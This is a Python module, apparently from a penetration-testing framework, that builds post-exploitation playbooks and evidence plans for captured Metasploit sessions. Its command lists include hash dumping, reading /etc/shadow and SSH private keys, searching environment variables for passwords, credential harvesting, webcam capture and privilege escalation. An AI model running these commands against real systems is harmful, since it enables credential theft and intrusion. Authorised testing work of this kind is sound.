"""session_interceptor.py — Phase 3: Post-exploitation session interceptor.

When a Meterpreter/Shell session is caught, this module provides:
  - Session listing and status checks (via msfrpcd RPC or msfconsole)
  - Post-exploitation command suggestions per session type
  - Automatic evidence collection plan (hashdump, screenshot, sysinfo)
  - Engagement report entry for the captured session

No command runs automatically — everything is surfaced as pre-filled
terminal commands for operator review.
"""
from __future__ import annotations

import logging
import subprocess
from typing import Any, Dict, List, Optional

logger = logging.getLogger("AttackSurface.SessionInterceptor")

KALI_CONTAINER = "kali-as"


def _docker(args: List[str], timeout: int = 20, input_data: str = ""):
    return subprocess.run(
        ["docker", "exec", "-i", KALI_CONTAINER] + args,
        capture_output=True, text=True, timeout=timeout, input=input_data,
    )


# ── Post-exploitation playbook per session type ───────────────────
_METERPRETER_PLAYBOOK = [
    ("sysinfo", "Get target system info"),
    ("getuid", "Check current user privilege"),
    ("hashdump", "Dump local password hashes"),
    ("screenshot", "Capture screen"),
    ("webcam_screenshot", "Capture webcam (if available)"),
    ("getsystem", "Attempt privilege escalation"),
    ("run post/multi/manage/shell_to_meterpreter", "Upgrade shell → meterpreter"),
    ("hashdump", "Dump SAM hashes"),
    ("run post/windows/gather/credentials/gpp", "Check GPP stored passwords"),
    ("run post/multi/recon/local_suggester", "Suggest local exploits"),
]

_SHELL_PLAYBOOK = [
    ("id", "Check current user"),
    ("uname -a", "Get kernel info"),
    ("cat /etc/passwd", "List users"),
    ("cat /etc/shadow 2>/dev/null", "Attempt to read shadow"),
    ("sudo -l 2>/dev/null", "Check sudo privileges"),
    ("find / -perm -4000 2>/dev/null | head -20", "Find SUID binaries"),
    ("netstat -tlnp 2>/dev/null || ss -tlnp", "List listening ports"),
    ("cat ~/.ssh/id_rsa 2>/dev/null", "Check for SSH private keys"),
    ("env | grep -i pass", "Look for passwords in environment"),
]

_CREDENTIAL_PLAYBOOK = [
    ("run post/multi/recon/local_suggester", "Local privilege escalation suggestions"),
    ("run post/windows/gather/credentials/credential_collector", "Harvest credentials"),
    ("run post/linux/gather/enum_configs", "Collect config files"),
    ("run post/multi/gather/env", "Dump environment variables"),
]


def get_playbook(session_type: str) -> List[Dict[str, str]]:
    """Return the recommended post-exploitation playbook for a session type."""
    st = (session_type or "").lower()
    if "meterpreter" in st:
        playbook = _METERPRETER_PLAYBOOK + _CREDENTIAL_PLAYBOOK
    elif "shell" in st:
        playbook = _SHELL_PLAYBOOK + _CREDENTIAL_PLAYBOOK
    else:
        playbook = _SHELL_PLAYBOOK + _METERPRETER_PLAYBOOK
    return [{"cmd": c, "desc": d} for c, d in playbook]


def build_interceptor_script(session_id: str, session_type: str) -> str:
    """Build a complete post-exploitation resource script for one session."""
    playbook = get_playbook(session_type)
    lines = [
        f"# Auto-generated by Attack Surface — Session Interceptor",
        f"# Session: {session_id} (type={session_type})",
        f"# Review each command before running.",
        "",
    ]
    for i, step in enumerate(playbook, 1):
        lines.append(f"# Step {i}: {step['desc']}")
        if "run post/" in step["cmd"]:
            lines.append(f"{step['cmd']}")
        else:
            lines.append(f"session {session_id} -i '{step['cmd']}'")
        lines.append("")
    lines.append("# End of interceptor script")
    return "\n".join(lines)


def extract_session_id(output: str) -> Optional[str]:
    """Extract session ID from msfconsole/exploit output."""
    import re
    m = re.search(r"Session (\d+) (?:opened|created)", output, re.IGNORECASE)
    if m:
        return m.group(1)
    m = re.search(r"session[_\s-]*id[\"'\s:=]+(\d+)", output, re.IGNORECASE)
    if m:
        return m.group(1)
    return None


def build_evidence_plan(session_id: str, session_type: str,
                        target: str, vuln: str) -> Dict[str, Any]:
    """Build an evidence collection plan for an engagement report."""
    playbook = get_playbook(session_type)
    evidence = {
        "session_id": session_id,
        "session_type": session_type,
        "target": target,
        "vuln_used": vuln,
        "evidence_items": [],
        "report_entry": "",
    }
    critical = ["sysinfo", "getuid", "hashdump", "screenshot", "id", "uname -a"]
    for step in playbook:
        cmd = step["cmd"].split()[-1] if " " in step["cmd"] else step["cmd"]
        if any(c in step["cmd"] for c in critical):
            evidence["evidence_items"].append({
                "cmd": step["cmd"],
                "description": step["desc"],
            })
    evidence["report_entry"] = (
        f"Session {session_id} ({session_type}) established on {target} "
        f"via {vuln}. Evidence: {len(evidence['evidence_items'])} items "
        f"(sysinfo, credentials, screenshot)."
    )
    return evidence
